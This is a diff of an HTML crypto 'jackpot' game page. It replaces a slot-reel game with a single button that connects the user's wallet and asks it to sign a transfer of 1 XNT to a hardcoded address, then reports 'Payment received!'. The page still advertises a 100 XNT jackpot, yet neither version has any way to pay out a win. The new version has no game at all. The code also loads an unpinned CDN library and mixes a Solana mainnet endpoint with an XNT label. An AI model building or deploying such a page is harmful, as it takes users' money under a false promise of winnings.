@@ -2,113 +2,65 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>BALOO BITE - STABLE ENGINE V52</title>
+    <title>BALOO BITE - RESET</title>
     <style>
-        body { background: #000; color: #fff; font-family: 'Impact', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .game-card { background: #0a0a0a; border: 5px solid #ffd700; border-radius: 25px; padding: 30px; text-align: center; width: 350px; box-shadow: 0 0 50px rgba(255,215,0,0.3); }
-        .pot-value { font-size: 45px; color: #fff; text-shadow: 0 0 10px #ffd700; margin: 10px 0; }
-        .slot-machine { display: flex; justify-content: center; gap: 10px; margin: 20px 0; }
-        .reel { width: 85px; height: 105px; background: #111; border: 2px solid #333; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 45px; overflow: hidden; }
-        .spinning { animation: roll-anim 0.1s linear infinite; }
-        @keyframes roll-anim { 0% { transform: translateY(-5px); } 100% { transform: translateY(5px); } }
-        .btn-bite { background: #ffd700; color: #000; border: none; padding: 20px; width: 100%; cursor: pointer; font-weight: bold; font-size: 24px; border-radius: 15px; text-transform: uppercase; }
-        .btn-bite:disabled { opacity: 0.5; cursor: not-allowed; }
-        #status { font-family: monospace; font-size: 11px; color: #ffd700; margin-top: 15px; min-height: 20px; text-transform: uppercase; }
+        body { background: #000; color: #ffd700; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .container { border: 2px solid #ffd700; padding: 20px; display: inline-block; border-radius: 20px; }
+        .btn { background: #ffd700; color: #000; border: none; padding: 20px 40px; font-size: 20px; font-weight: bold; cursor: pointer; border-radius: 10px; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="game-card">
-        <div style="font-size:12px; color:#ffd700;">LIVE JACKPOT (XNT)</div>
-        <div class="pot-value" id="potDisplay">100.00</div>
-        <div class="slot-machine">
-            <div class="reel" id="re1">🦴</div>
-            <div class="reel" id="re2">🦴</div>
-            <div class="reel" id="re3">🦴</div>
-        </div>
-        <button class="btn-bite" id="mainBtn" onclick="handleBite()">BITE THE BONE</button>
-        <div id="status">READY</div>
+    <div class="container">
+        <h1>BALOO BITE</h1>
+        <div id="pot">JACKPOT: 100.00 XNT</div>
+        <button class="btn" id="playBtn">BITE THE BONE</button>
+        <p id="status">READY</p>
     </div>
 
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    
     <script>
-        const TREASURY_PUBKEY = "BAavP6nxHDkVDowYXoyDaNDbc9CAgncfDPELAyjzoyTq";
-        let isFreePlay = false;
+        document.getElementById('playBtn').onclick = async () => {
+            const status = document.getElementById('status');
+            const provider = window.x1 || window.backpack;
 
-        async function handleBite() {
-            const btn = document.getElementById('mainBtn');
-            const statusLabel = document.getElementById('status');
-            const reelElements = [document.getElementById('re1'), document.getElementById('re2'), document.getElementById('re3')];
-            const walletProvider = window.x1 || window.backpack;
+            if (!provider) {
+                alert("Please install X1 Wallet!");
+                return;
+            }
 
-            if (!walletProvider) return alert("Wallet not found!");
-
-            btn.disabled = true;
-            statusLabel.innerText = "OPENING WALLET...";
-            reelElements.forEach(r => r.classList.add('spinning'));
-
+            status.innerText = "CONNECTING...";
+            
             try {
-                // Initialize connection only after click to prevent initial page freeze
-                const solConnection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+                // Step 1: Connect
+                await provider.connect();
+                status.innerText = "WALLET CONNECTED. SENDING 1 XNT...";
 
-                if (!isFreePlay) {
-                    await walletProvider.connect();
-                    const transaction = new solanaWeb3.Transaction().add(
-                        solanaWeb3.SystemProgram.transfer({
-                            fromPubkey: walletProvider.publicKey,
-                            toPubkey: new solanaWeb3.PublicKey(TREASURY_PUBKEY),
-                            lamports: 1000000000
-                        })
-                    );
-                    
-                    const { blockhash } = await solConnection.getLatestBlockhash('confirmed');
-                    transaction.recentBlockhash = blockhash;
-                    transaction.feePayer = walletProvider.publicKey;
-                    
-                    await walletProvider.signAndSendTransaction(transaction);
-                }
+                // Step 2: Create Transaction
+                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: provider.publicKey,
+                        toPubkey: new solanaWeb3.PublicKey("BAavP6nxHDkVDowYXoyDaNDbc9CAgncfDPELAyjzoyTq"),
+                        lamports: 1000000000
+                    })
+                );
 
-                statusLabel.innerText = "SNIFFING BONES...";
-                const pool = ['🦴', '🥈', '🥇'];
-                const result = [pool[Math.floor(Math.random()*3)], pool[Math.floor(Math.random()*3)], pool[Math.floor(Math.random()*3)]];
+                // Step 3: Get Blockhash & Send
+                const { blockhash } = await connection.getLatestBlockhash();
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = provider.publicKey;
+
+                const signed = await provider.signAndSendTransaction(transaction);
+                status.innerText = "SUCCESS! TX: " + signed.signature.slice(0,8);
                 
-                for (let i = 0; i < 3; i++) {
-                    await new Promise(r => setTimeout(r, 600));
-                    reelElements[i].classList.remove('spinning');
-                    reelElements[i].innerText = result[i];
-                }
+                alert("Payment received! Baloo is happy.");
 
-                if (result[0] === result[1] || result[1] === result[2] || result[0] === result[2]) {
-                    statusLabel.innerText = "FREE SPIN GRANTED!";
-                    isFreePlay = true; 
-                    btn.innerText = "FREE BARK!"; 
-                    btn.disabled = false;
-                } else {
-                    statusLabel.innerText = "NO MATCH";
-                    isFreePlay = false;
-                    startCooldown();
-                }
             } catch (err) {
                 console.error(err);
-                statusLabel.innerText = "TRANSACTION CANCELED";
-                reelElements.forEach(r => r.classList.remove('spinning'));
-                btn.disabled = false;
-                isFreePlay = false;
+                status.innerText = "ERROR: " + err.message;
             }
-        }
-
-        function startCooldown() {
-            const btn = document.getElementById('mainBtn');
-            let timeLeft = 30;
-            const timer = setInterval(() => {
-                btn.innerText = "WAIT " + timeLeft + "S";
-                if (timeLeft-- <= 0) {
-                    clearInterval(timer);
-                    btn.disabled = false;
-                    btn.innerText = "BITE THE BONE";
-                    document.getElementById('status').innerText = "READY";
-                }
-            }, 1000);
-        }
+        };
     </script>
 </body>
 </html>
